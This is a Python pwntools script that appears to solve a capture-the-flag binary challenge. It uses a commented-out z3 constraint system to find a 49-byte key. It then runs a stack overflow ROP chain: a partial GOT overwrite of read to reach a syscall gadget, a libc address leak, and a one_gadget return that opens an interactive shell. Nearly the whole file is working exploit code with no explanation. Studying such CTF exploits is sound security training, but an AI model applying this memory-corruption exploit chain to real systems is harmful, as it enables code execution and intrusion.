# from z3 import *

# a = Int('a')    #1
# b = Int('b')    #2
# c = Int('c')    #3
# d = Int('d')    #4
# e = Int('e')    #5
# f = Int('f')    #6
# g = Int('g')    #7
# h = Int('h')    #8
# i = Int('i')    #9
# j = Int('j')    #10
# k = Int('k')    #11
# l = Int('l')    #12
# m = Int('m')    #13
# n = Int('n')    #14
# o = Int('o')    #15
# p = Int('p')    #16
# q = Int('q')    #17
# r = Int('r')    #18
# s = Int('s')    #19
# t = Int('t')    #20
# u = Int('u')    #21
# v = Int('v')    #22
# w = Int('w')    #23
# x = Int('x')    #24
# y = Int('y')    #25
# z = Int('z')    #26
# a1 = Int('a1')  #27
# b1 = Int('b1')  #28
# c1 = Int('c1')  #29
# d1 = Int('d1')  #30
# e1 = Int('e1')  #31
# f1 = Int('f1')  #32
# g1 = Int('g1')  #33
# h1 = Int('h1')  #34
# i1 = Int('i1')  #35
# j1 = Int('j1')  #36
# k1 = Int('k1')  #37
# l1 = Int('l1')  #38
# m1 = Int('m1')  #39
# n1 = Int('n1')  #40
# o1 = Int('o1')  #41
# p1 = Int('p1')  #42
# q1 = Int('q1')  #43
# r1 = Int('r1')  #44
# s1 = Int('s1')  #45
# t1 = Int('t1')  #46
# u1 = Int('u1')  #47
# v1 = Int('v1')  #48
# w1 = Int('w1')  #49

# solve(
#   q * h1 == 50960 ,
#   t - o == -83 ,
#   i + v == 415 ,
#   h * d == 2546 ,
#   b1 * d == 10452 ,
#   b * v == 40890 ,
#   r - c1 == 127 ,
#   i - n == -43 ,
#   v1 * b == 35148 ,
#   l1 + h1 == 404 ,
#   j - n == 24 ,
#   o1 - y == 114 ,
#   x + h == 28 ,
#   l * u1 == 49600 ,
#   i - k == 44 ,
#   b1 - h1 == -130 ,
#   e1 * r == 0,
#   p1 * z == 12710 ,
#   q * j1 == 36995 ,
#   r - f == 54 ,
#   f - c == 56 ,
#   y + h == 58 ,
#   j1 + c == 211 ,
#   f + e == 242 ,
#   y - s1 == 31 ,
#   s1 - i == -172 ,
#   p * m1 == 57750 ,
#   v1 + q == 447 ,
#   k1 - j1 == -63 ,
#   g1 + o1 == 194 ,
#   l + k1 == 288 ,
#   b + p1 == 236 ,
#   g1 - q == -204 ,
#   v1 * r == 34340 ,
#   h1 + o == 399 ,
#   h + e1 == 19 ,
#   g * o1 == 30447 ,
#   l + m1 == 431 ,
#   i1 - d1 == 89 ,
#   k1 - j == -159 ,
#   w1 - n == -192 ,
#   c - u == 12 ,
#   w1 + l1 == 227 ,
#   p1 + u == 110 ,
#   2 * q1 == 106 ,
#   w * g == 25074 ,
#   q + n1 == 419 ,
#   u + b == 222 ,
#   t * t1 == 12312 ,
#   u1 - n1 == 74 ,
#   h * z == 3895 ,
#   j1 * k1 == 13288 ,
#   j * i1 == 22477 ,
#   s + l == 236 ,
#   p1 - a == 53 ,
#   m * j1 == 17818 ,
#   n * s == 8028 ,
#   k1 * v1 == 17776 ,
#   q1 - i1 == -38 ,
#   c1 * g == 8557 ,
#   b * k1 == 15312 ,
#   w1 * h == 589 ,
#   l1 - m == 78 ,
#   o + n1 == 365 ,
#   i + v == 415 ,
#   m1 - c1 == 188 ,
#   i1 - d == -43 ,
#   g + z == 404 ,
#   o1 - k == 17 ,
#   p1 - d == -72 ,
#   s - b1 == -42 ,
#   a1 * p1 == 11780 ,
#   d1 + y == 41 ,
#   z + a1 == 395 ,
#   e1 - g == -199 ,
#   c1 - w1 == 12 ,
#   2 * c1 == 86 ,
#   b1 * r == 13260 ,
#   d + x == 143 ,
#   q1 * r1 == 6095 ,
#   o1 * n == 34119 ,
#   e1 - u1 == -248 ,
#   q1 * h == 1007 ,
#   u + v == 283 ,
#   h * v == 4465 ,
#   l * q1 == 10600 ,
#   g1 + m1 == 272 ,
#   p - z == 45 ,
#   b - n == -49 ,
#   f1 + u1 == 485 ,
#   d * g == 26666 ,
#   y - q1 == -14 ,
#   i1 * j1 == 13741 ,
#   j * b1 == 19266 ,
#   k * u1 == 33728 ,
#   q1 + z == 258 ,
#   f1 - n1 == 63 ,
#   o - c == 131 ,
#   u1 * p1 == 15376)

#! /usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch='amd64', os='linux', log_level='debug')

sh = process('./pwn')
# sh = process('./pwn', env={'LD_PRELOAD':'libc-2.23.so'})
# gdb.attach(sh, 'b *0x400526\n')

z = 205
j1 = 151
y = 39
g = 199
f1 = 237
n = 223
p = 250
l = 200
v = 235
u = 48
h = 19
r1 = 115
x = 9
c1 = 43
w1 = 31
e1 = 0
a1 = 190
d1 = 2
p1 = 62
d = 134
k = 136
m1 = 231
i1 = 91
m = 118
a = 9
s = 36
j = 247
k1 = 88
t1 = 114
b = 174
n1 = 174
w = 126
q1 = 53
l1 = 196
c = 60
o1 = 153
o = 191
g1 = 41
s1 = 8
e = 126
f = 116
r = 170
q = 245
u1 = 248
h1 = 208
v1 = 202
b1 = 78
i = 180
t = 108

cur = ''
cur +=chr(a)
cur +=chr(b)
cur +=chr(c)
cur +=chr(d)
cur +=chr(e)
cur +=chr(f)
cur +=chr(g)
cur +=chr(h)
cur +=chr(i)
cur +=chr(j)
cur +=chr(k)
cur +=chr(l)
cur +=chr(m)
cur +=chr(n)
cur +=chr(o)
cur +=chr(p)
cur +=chr(q)
cur +=chr(r)
cur +=chr(s)
cur +=chr(t)
cur +=chr(u)
cur +=chr(0)
cur +=chr(v)
cur +=chr(w)
cur +=chr(x)
cur +=chr(y)
cur +=chr(z)
cur +=chr(a1)
cur +=chr(b1)
cur +=chr(c1)
cur +=chr(d1)
cur +=chr(e1)
cur +=chr(f1)
cur +=chr(g1)
cur +=chr(h1)
cur +=chr(i1)
cur +=chr(j1)
cur +=chr(k1)
cur +=chr(l1)
cur +=chr(m1)
cur +=chr(n1)
cur +=chr(o1)
cur +=chr(p1)
cur +=chr(q1)
cur +=chr(r1)
cur +=chr(s1)
cur +=chr(t1)
cur +=chr(u1)
cur +=chr(v1)
cur +=chr(w1)

sh.send(cur.ljust(0x64, '\x00'))

# read(read@got) -> syscall 
# call write(1, read@got, 0x30)
# read(read@got) -> read
# QAQ -> og

pop_rdi_ret = 0x00000000004012c3
pop_rsi2ret = 0x00000000004012c1
ret = 0x00000000004003e1
QAQ = 0x400526
mov_eax = 0x401254
bss = 0x602100

read_got = 0x602018
read_plt = 0x400400

payload = 'a' * 0x70 + p64(bss) + p64(pop_rsi2ret) + p64(bss) + p64(0) + p64(read_plt) 
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi2ret) + p64(read_got) + p64(0) + p64(read_plt)
payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi2ret) + p64(read_got) + p64(0) + p64(read_plt)
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi2ret) + p64(read_got) + p64(0) + p64(mov_eax) 

sh.sendline(payload)
sleep(0.1)
payload = p64(0) + p64(read_plt) + p64(QAQ)
sh.sendline(payload)
sleep(0.1)
# sh.send('\x1e')
sh.send('\x5e')
sleep(0.1)
libc = u64(sh.recvuntil('\x7f').ljust(8,'\x00')) - 0xf725e
success(str(hex(libc)))
sh.send('\x50')
sleep(0.1)
og = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
payload = 'a' * 0x78 + p64(og[2] + libc)
sh.sendline(payload)
sh.interactive()